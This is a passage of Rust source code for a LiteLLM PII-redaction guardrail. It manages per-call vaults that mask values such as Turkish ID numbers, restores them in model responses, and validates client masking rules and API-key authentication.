                    out.entry(token).or_insert((start, end, kind));
                }
            }
        }
        i = j;
    }
    out
}

/// Bounds of a [`RestoreSessions`] table (see its docs for measured
/// memory).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct RestoreLimits {
    /// Live sessions at most. When the table is full and no session has
    /// expired, a new call gets no session: its texts are masked with
    /// labels (`[TCKN]`) and its answer is not restored. A live session is
    /// never evicted to make room.
    pub max_sessions: usize,
    /// Vault entries per session at most; further values are masked with
    /// labels, not numbered.
    pub max_entries: usize,
    /// Bytes of placeholders and originals per session at most; further
    /// values are masked with labels.
    pub max_bytes: usize,
    /// A session not used for this long, before any response-side call
    /// used it, expires (the model call is taking longer, or the call has
    /// no response-side guardrail).
    pub idle_timeout: Duration,
    /// After the first response-side call used it, a session expires once
    /// it has not been used for this long. LiteLLM does not mark the last
    /// streaming round, so this is how a finished call's session ends.
    pub linger_after_response: Duration,
}

impl Default for RestoreLimits {
    /// 2048 sessions of at most 128 entries and 8 KiB, 10 minutes idle
    /// before the response, 30 seconds after it (a full table of full
    /// sessions is about 60 MiB, see [`RestoreSessions`]).
    fn default() -> Self {
        Self {
            max_sessions: 2048,
            max_entries: 128,
            max_bytes: 8 * 1024,
            idle_timeout: Duration::from_secs(600),
            linger_after_response: Duration::from_secs(30),
        }
    }
}

/// The server-held vaults of LiteLLM calls, for response-side restoration
/// on `POST /beta/litellm_basic_guardrail_api` (see the module docs of
/// [`crate::api`]): the request-side call of a LiteLLM call stores its
/// vault under the call id, the response-side calls of the same call
/// restore the model's answer with it.
///
/// A session is keyed by the LiteLLM call id and the LiteLLM key hash the
/// call was authenticated with, and only for call ids LiteLLM generated
/// (a request whose client set `x-litellm-call-id` gets no session). The
/// request side never returns originals; only a response-side call does.
/// A session ends when its call's answer was blocked, when it expires
/// (see [`RestoreLimits`]), on [`Self::end`] or [`Self::clear`].
///
/// Memory (resident-set growth, release build, 4096 sessions, see
/// `measure_memory_per_session` in `tests/api_litellm_restore.rs`): a
/// session keeps its call's [`Vault`] (entries, round-trip exemptions and
/// tolerant-form index), about 185 bytes per e-mail-sized value plus
/// about 1.3 KiB per session (1 value: 2.0 KiB, 16 values: 3.8 KiB, 64
/// values: 11.6 KiB, 256 values: 47 KiB). A response-side call restores
/// with a copy, so the restore automaton it builds is not kept. With the
/// default limits, a full table of full sessions (128 entries and 8 KiB of
/// values each, about 30 KiB) stays under about 2048 x 30 KiB = 60 MiB.
///
/// # Examples
/// ```
/// use redactify::api::{handle_request_with, ApiState, RestoreLimits, RestoreSessions};
/// use serde_json::json;
///
/// let state = ApiState::default().with_litellm_restore(RestoreSessions::new(RestoreLimits::default()));
/// let call = |input_type: &str, text: &str| {
///     let body = json!({
///         "texts": [text], "input_type": input_type,
///         "litellm_call_id": "5fb567a8-e153-4c65-987a-6cfa3fe4942d",
///         "request_headers": {"content-type": "application/json"},
///     });
///     let r = handle_request_with(&state, "POST", "/beta/litellm_basic_guardrail_api", &body.to_string());
///     serde_json::from_str::<serde_json::Value>(&r.body).unwrap()["texts"][0].clone()
/// };
/// assert_eq!(call("request", "TCKN 12345678950"), "TCKN [TCKN_1]");
/// assert_eq!(call("response", "Noted: [TCKN_1]."), "Noted: 12345678950.");
/// ```
pub struct RestoreSessions {
    limits: RestoreLimits,
    /// The internal pseudonym mask style (random per table).
    style: MaskStyle,
    table: Mutex<SessionTable>,
}

#[derive(Default)]
struct SessionTable {
    live: HashMap<Box<str>, Session>,
    next_version: u64,
    last_sweep: Option<Instant>,
}

struct Session {
    /// The call's vault (with its round-trip exemptions) and restore
    /// options; a response-side call restores with a copy, so no restore
    /// automaton is kept (see the memory note on [`RestoreSessions`]).
    data: Arc<SessionVault>,
    /// Changes on every store (a concurrent request-side call of the same
    /// call never overwrites another's numbering).
    version: u64,
    last_seen: Instant,
    responded: bool,
}

/// How often a store sweeps expired sessions at most (a full table sweeps
/// on every new session).
const SWEEP_INTERVAL: Duration = Duration::from_secs(10);

impl Default for RestoreSessions {
    /// A table with [`RestoreLimits::default`].
    fn default() -> Self {
        Self::new(RestoreLimits::default())
    }
}

impl std::fmt::Debug for RestoreSessions {
    /// Limits and the number of live sessions; never ids or values.
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("RestoreSessions")
            .field("limits", &self.limits)
            .field("live", &self.len())
            .finish_non_exhaustive()
    }
}

impl RestoreSessions {
    /// An empty table (no heap memory until the first session).
    #[must_use]
    pub fn new(limits: RestoreLimits) -> Self {
        Self {
            limits,
            style: MaskStyle::Pseudonym(random_key()),
            table: Mutex::new(SessionTable::default()),
        }
    }

    /// The table's bounds.
    #[must_use]
    pub const fn limits(&self) -> RestoreLimits {
        self.limits
    }

    /// Number of live sessions (expired ones not yet swept included).
    #[must_use]
    pub fn len(&self) -> usize {
        self.lock().live.len()
    }

    /// Whether no session is live.
    #[must_use]
    pub fn is_empty(&self) -> bool {
        self.len() == 0
    }

    /// Ends the session of LiteLLM call `call_id` authenticated with the
    /// LiteLLM key hash `user_api_key_hash` (`None` when LiteLLM sent
    /// none); returns whether it was live.
    pub fn end(&self, call_id: &str, user_api_key_hash: Option<&str>) -> bool {
        self.end_key(&join_key(call_id, user_api_key_hash.unwrap_or("")))
    }

    /// Ends every session.
    pub fn clear(&self) {
        let mut table = self.lock();
        table.live = HashMap::new();
    }

    /// Drops every expired session now; returns how many.
    pub fn sweep(&self) -> usize {
        let now = Instant::now();
        let mut table = self.lock();
        self.sweep_locked(&mut table, now)
    }

    fn end_key(&self, key: &str) -> bool {
        self.lock().live.remove(key).is_some()
    }

    fn style(&self) -> &MaskStyle {
        &self.style
    }

    fn expired(&self, s: &Session, now: Instant) -> bool {
        let ttl = if s.responded {
            self.limits.linger_after_response
        } else {
            self.limits.idle_timeout
        };
        now.saturating_duration_since(s.last_seen) > ttl
    }

    /// The live session of `key` (an expired one is dropped).
    fn live<'t>(
        &self,
        table: &'t mut SessionTable,
        key: &str,
        now: Instant,
    ) -> Option<&'t mut Session> {
        if table.live.get(key).is_some_and(|s| self.expired(s, now)) {
            table.live.remove(key);
            return None;
        }
        table.live.get_mut(key)
    }

    /// Request side: the session's vault and version, when it has one (a
    /// repeated request-side call must keep its numbering).
    fn snapshot(&self, key: &str, now: Instant) -> Option<(Arc<SessionVault>, u64)> {
        let mut table = self.lock();
        let s = self.live(&mut table, key, now)?;
        s.last_seen = now;
        Some((Arc::clone(&s.data), s.version))
    }

    /// Request side: stores `data` as the session of `key`. `base` is the
    /// version it replaces (`None` for a new session). Returns
    /// `false` when the session changed since that snapshot or the table
    /// is full.
    fn store(&self, key: &str, data: Arc<SessionVault>, base: Option<u64>, now: Instant) -> bool {
        let mut guard = self.lock();
        let table = &mut *guard;
        table.next_version += 1;
        let version = table.next_version;
        if let Some(s) = self.live(table, key, now) {
            if Some(s.version) != base {
                return false;
            }
            s.data = data;
            s.version = version;
            s.last_seen = now;
            return true;
        }
        let due = table
            .last_sweep
            .map_or(true, |t| now.saturating_duration_since(t) >= SWEEP_INTERVAL);
        if due || table.live.len() >= self.limits.max_sessions {
            self.sweep_locked(table, now);
        }
        if table.live.len() >= self.limits.max_sessions {
            return false;
        }
        table.live.insert(
            key.into(),
            Session {
                data,
                version,
                last_seen: now,
                responded: false,
            },
        );
        true
    }

    /// Response side: the session's vault (`None` when there is none);
    /// the session now lingers for
    /// [`RestoreLimits::linger_after_response`].
    fn vault_for_response(&self, key: &str, now: Instant) -> Option<Arc<SessionVault>> {
        let mut table = self.lock();
        let s = self.live(&mut table, key, now)?;
        s.last_seen = now;
        s.responded = true;
        Some(Arc::clone(&s.data))
    }

    fn sweep_locked(&self, table: &mut SessionTable, now: Instant) -> usize {
        let before = table.live.len();
        table.live.retain(|_, s| !self.expired(s, now));
        table.last_sweep = Some(now);
        before - table.live.len()
    }

    /// The table, also after a panic in another thread (every update is a
    /// single map operation, so the state stays consistent).
    fn lock(&self) -> std::sync::MutexGuard<'_, SessionTable> {
        self.table
            .lock()
            .unwrap_or_else(std::sync::PoisonError::into_inner)
    }
}

/// A 32-byte key from the standard library's per-process random SipHash
/// keys (OS randomness). It keys only the internal pseudonyms, which never
/// leave the process.
fn random_key() -> PseudonymKey {
    use std::hash::BuildHasher;
    let state = std::hash::RandomState::new();
    let bytes: Vec<u8> = (0u64..4)
        .flat_map(|i| state.hash_one(i).to_le_bytes())
        .collect();
    match PseudonymKey::new(bytes) {
        Ok(key) => key,
        // 4 x 8 bytes is PseudonymKey::MIN_LEN: not reachable
        Err(_) => unreachable!("a 32-byte key is long enough"),
    }
}

/// The `BLOCKED` body: the position and the static label of what blocked
/// it (the first blocking verdict's category, else the top signal's kind),
/// never request content.
fn blocked(field: &str, index: usize, d: &Decision) -> ApiResponse {
    let label = d
        .verdicts
        .iter()
        .find(|v| v.action == GuardAction::Block)
        .map(|v| v.category.as_str())
        .or_else(|| d.top_signal.as_ref().map(|s| s.kind.as_str()))
        .unwrap_or("POLICY");
    ok(serde_json::json!({
        "action": "BLOCKED",
        "blocked_reason": format!("redactify blocked {field}[{index}]: {label}"),
    }))
}

/// The `texts` field: absent or `null` is no text (LiteLLM declares it
/// optional), otherwise an array of strings; a non-string item is
/// `bad_texts`, naming its position.
fn texts_from(v: &serde_json::Value) -> Result<Vec<&str>, ApiResponse> {
    match v.get("texts") {
        None | Some(serde_json::Value::Null) => Ok(Vec::new()),
        Some(serde_json::Value::Array(items)) => items
            .iter()
            .enumerate()
            .map(|(i, t)| {
                t.as_str()
                    .ok_or_else(|| err(400, "bad_texts", format!("`texts[{i}]` is not a string")))
            })
            .collect(),
        Some(_) => Err(err(400, "bad_texts", "`texts` must be an array of strings")),
    }
}

/// The payload of every item of the optional `tool_calls` (see
/// [`tool_call_payload`]). A non-array `tool_calls` is `bad_tool_calls`.
fn tool_call_arguments(v: &serde_json::Value) -> Result<Vec<Cow<'_, str>>, ApiResponse> {
    match v.get("tool_calls") {
        None | Some(serde_json::Value::Null) => Ok(Vec::new()),
        Some(serde_json::Value::Array(calls)) => {
            Ok(calls.iter().filter_map(tool_call_payload).collect())
        }
        Some(_) => Err(err(
            400,
            "bad_tool_calls",
            "`tool_calls` must be an array of tool-call objects",
        )),
    }
}

/// What one tool call carries, as text to decide on. LiteLLM sends OpenAI
/// tool calls, whose `function.arguments` is a JSON string; a string is
/// taken as is and any other JSON value (an object or array a translation
/// left decoded) is serialized, member names included, so it is never
/// skipped. A call without `function.arguments` is checked whole, minus its
/// `id`, `type` and `index` bookkeeping: an unknown shape is inspected, not
/// waved through. Only an empty call contributes nothing.
fn tool_call_payload(call: &serde_json::Value) -> Option<Cow<'_, str>> {
    use serde_json::Value;
    match call.get("function").and_then(|f| f.get("arguments")) {
        Some(Value::String(args)) => Some(Cow::Borrowed(args)),
        Some(Value::Null) | None => match call {
            Value::Null => None,
            Value::String(s) => Some(Cow::Borrowed(s)),
            Value::Object(map) => {
                let rest: serde_json::Map<String, Value> = map
                    .iter()
                    .filter(|(k, _)| !matches!(k.as_str(), "id" | "type" | "index"))
                    .map(|(k, v)| (k.clone(), v.clone()))
                    .collect();
                (!rest.is_empty()).then(|| Cow::Owned(Value::Object(rest).to_string()))
            }
            other => Some(Cow::Owned(other.to_string())),
        },
        Some(other) => Some(Cow::Owned(other.to_string())),
    }
}

/// The client's `words` / `patterns`, applied to text the built-in pipeline
/// has ALREADY masked. LiteLLM end users can set these rules (their
/// `extra_body` overrides the configured params), so they must only add
/// masks: run together with the built-in rules, a short pattern could win
/// overlap resolution against a built-in entity and leave part of it
/// visible (`TCK[CUSTOM_PATTERN]2345678950`). On the masked text every
/// built-in value is already a placeholder; only the client's own matches
/// (`CUSTOM_PATTERN`, `CUSTOM_WORD`) and unscannable lines are rendered,
/// so the built-in masking is exactly what it is without client rules.
///
/// With restoration on, the vault placeholders of the text are `protected`
/// byte ranges: a client match overlapping one is dropped, so a pattern
/// such as `\d` cannot split `[TCKN_1]` and leave it unrestorable.
struct ClientRules<'a>(Detector<'a>);

impl ClientRules<'_> {
    fn mask(&self, text: String, protected: &[(usize, usize)]) -> String {
        const INCOMPLETE: &str = "SCAN_INCOMPLETE";
        let report = self.0.scan(&text);
        let overlaps_protected =
            |s: usize, e: usize| protected.iter().any(|&(ps, pe)| s < pe && ps < e);
        let mut spans: Vec<(usize, usize, &str)> = report
            .entities
            .iter()
            .filter(|e| {
                matches!(
                    e.kind.as_str(),
                    super::PATTERN_LABEL | super::DENY_WORD_LABEL
                ) && !overlaps_protected(e.start, e.end)
            })
            .map(|e| (e.start, e.end, e.kind.as_str()))
            .chain(report.error_spans.iter().map(|&(s, e)| (s, e, INCOMPLETE)))
            .collect();
        if spans.is_empty() {
            return text;
        }
        spans.sort_unstable_by_key(|&(start, _, _)| start);
        let mut out = String::with_capacity(text.len());
        let mut written = 0;
        let mut spans = spans.into_iter().peekable();
        while let Some((start, mut end, mut label)) = spans.next() {
            // overlapping spans form one region; an unscannable line wins
            while let Some(&(s, e, l)) = spans.peek() {
                if s >= end {
                    break;
                }
                end = end.max(e);
                if l == INCOMPLETE {
                    label = INCOMPLETE;
                }
                spans.next();
            }
            out.push_str(&text[written..start]);
            out.push('[');
            out.push_str(label);
            out.push(']');
            written = end;
        }
        out.push_str(&text[written..]);
        out
    }
}

/// The audit request id: `litellm_call_id` when it fits the `request_id`
/// rule (1 to 128 printable ASCII characters), else none (the per-process
/// counter applies). LiteLLM chooses the format, so a mismatch is not an
/// error.
fn call_id(v: &serde_json::Value) -> Option<&str> {
    v.get("litellm_call_id")
        .and_then(serde_json::Value::as_str)
        .filter(|id| {
            !id.is_empty()
                && id.len() <= super::MAX_REQUEST_ID_LEN
                && id.bytes().all(|b| (0x20..=0x7e).contains(&b))
        })
}

/// The target of every request text, from the roles of
/// `structured_messages` walked with LiteLLM's extraction rule; `None`
/// when the walk does not give exactly `count` texts.
fn request_targets(v: &serde_json::Value, count: usize) -> Option<Vec<GuardTarget>> {
    let messages = v.get("structured_messages")?.as_array()?;
    let mut targets = Vec::with_capacity(count);
    for m in messages {
        let target = match m.get("role").and_then(serde_json::Value::as_str) {
            Some(role)
                if role.eq_ignore_ascii_case("tool") || role.eq_ignore_ascii_case("function") =>
            {
                GuardTarget::ToolResponse
            }
            _ => GuardTarget::UserPrompt,
        };
        match m.get("content") {
            Some(serde_json::Value::String(_)) => targets.push(target),
            Some(serde_json::Value::Array(items)) => {
                let n = items
                    .iter()
                    .filter(|item| item.get("text").is_some_and(|t| !t.is_null()))
                    .count();
                targets.extend(std::iter::repeat(target).take(n));
            }
            _ => {}
        }
        if targets.len() > count {
            return None;
        }
    }
    (targets.len() == count).then_some(targets)
}

/// The accepted `additional_provider_specific_params`.
struct ProviderParams {
    /// `words` / `patterns` rules (the mask stays the default label).
    extras: RequestExtras,
    /// HTML-encode model output like `/v1/sanitize` does.
    html_encode: bool,
    /// `restore`: `Some(false)` opts this guardrail out of restoration,
    /// `Some(true)` requires it (a 400 when the server does not enable it).
    restore: Option<bool>,
}

impl ProviderParams {
    fn from_request(v: &serde_json::Value) -> Result<Self, ApiResponse> {
        let bad = |m: &str| err(400, "bad_provider_params", m.to_owned());
        let params = match v.get("additional_provider_specific_params") {
            None | Some(serde_json::Value::Null) => {
                return Ok(Self {
                    extras: RequestExtras::from_request(&serde_json::Value::Null)?,
                    html_encode: false,
                    restore: None,
                })
            }
            Some(p @ serde_json::Value::Object(map)) => {
                if map
                    .keys()
                    .any(|k| !PROVIDER_PARAM_KEYS.contains(&k.as_str()))
                {
                    return Err(bad(
                        "`additional_provider_specific_params` accepts only `words`, \
                         `words_ignore_case`, `patterns` and `html_encode`; options that \
                         narrow detection belong in the server policy",
                    ));
                }
                p
            }
            Some(_) => {
                return Err(bad(
                    "`additional_provider_specific_params` must be an object",
                ))
            }
        };
        // a client pattern is always CUSTOM_PATTERN with the default score:
        // a built-in label or a chosen score is refused here, before the
        // shared parser (which accepts both on the other endpoints)
        if let Some(serde_json::Value::Array(patterns)) = params.get("patterns") {
            for (i, p) in patterns.iter().enumerate() {
                if p.as_object()
                    .is_some_and(|o| o.keys().any(|k| !matches!(k.as_str(), "pattern" | "cues")))
                {
                    return Err(err(
                        400,
                        "bad_provider_params",
                        format!(
                            "`patterns[{i}]` accepts only `pattern` and `cues` here: a client \
                             pattern always reports CUSTOM_PATTERN with the default score"
                        ),
                    ));
                }
            }
        }
        let html_encode = match params.get("html_encode") {
            None | Some(serde_json::Value::Null) => false,
            Some(serde_json::Value::Bool(b)) => *b,
            Some(_) => return Err(bad("`html_encode` must be a boolean")),
        };
        let restore = match params.get("restore") {
            None | Some(serde_json::Value::Null) => None,
            Some(serde_json::Value::Bool(b)) => Some(*b),
            Some(_) => return Err(bad("`restore` must be a boolean")),
        };
        Ok(Self {
            extras: RequestExtras::from_request(params)?,
            html_encode,
            restore,
        })
    }
}

/// Authentication of a LiteLLM call when the server has a token: LiteLLM
/// sends its configured `api_key` as `x-api-key`, so that header carries
/// the same token on this path. An `Authorization` header, when present,
/// takes precedence and follows the bearer rules of every other path.
pub(super) fn authorize(
    token: &BearerToken,
    headers: &[tiny_http::Header],
) -> Result<(), (ApiResponse, &'static str)> {
    let named = |name: &'static str| {
        headers
            .iter()
            .filter(move |h| h.field.equiv(name))
            .map(|h| h.value.as_str())
    };
    if named("Authorization").next().is_some() {
        return super::authorize(token, named("Authorization"));
    }
    let mut keys = named(API_KEY_HEADER);
    let first = keys.next();
    if keys.next().is_some() {
        return Err((
            err(400, "invalid_request", "send exactly one x-api-key header"),
            super::CHALLENGE_INVALID_REQUEST,
        ));
    }
    match first {
        None => Err((
            err(
                401,
                "unauthorized",
                "this endpoint requires `Authorization: Bearer <token>` or `x-api-key: <token>`",
            ),
            super::CHALLENGE_MISSING,
        )),
        Some(presented) if token.matches(presented) => Ok(()),
        Some(_) => Err((
            err(401, "invalid_token", "the API key is not accepted"),
            super::CHALLENGE_INVALID_TOKEN,
        )),
    }
}
